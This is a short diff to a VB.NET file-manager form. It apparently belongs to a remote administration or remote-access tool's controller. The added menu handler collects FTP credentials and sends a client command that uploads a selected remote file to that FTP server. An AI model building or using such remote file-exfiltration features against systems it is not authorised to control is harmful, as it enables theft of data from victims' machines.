@@ -367,6 +367,28 @@ Public Class FileManager_Form
         End If
     End Sub
 
+    Private Async Sub UploadFIleOnFTPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadFIleOnFTPToolStripMenuItem.Click
+        If ListView1.SelectedItems.Count = 1 Then
+            If ListView1.SelectedItems(0).Tag = "FILE" Then
+
+                Dim S As String = InputBox("Insert your FTP url (like : ftp://127.0.0.1/) : ")
+                Dim U As String = InputBox("Insert your FTP username : ")
+                Dim P As String = InputBox("Insert your FTP password : ")
+
+                '   Dim o As String = PL_PW & "|SP1|" & "|SP2|" & "|FTP|" & "|SP2|" & S & "|SP2|" & U & "|SP2|" & P & "|ENDING|"
+
+                Dim newP As String = Label1.Text & ListView1.SelectedItems(0).Text
+
+                Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|UPOFTPS|" & "|SP2|" & newP & "|SP2|" & S & "|SP2|" & U & "|SP2|" & P & "|ENDING|"
+
+
+
+
+                Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))
+            End If
+        End If
+    End Sub
+
 #End Region
 
 End Class
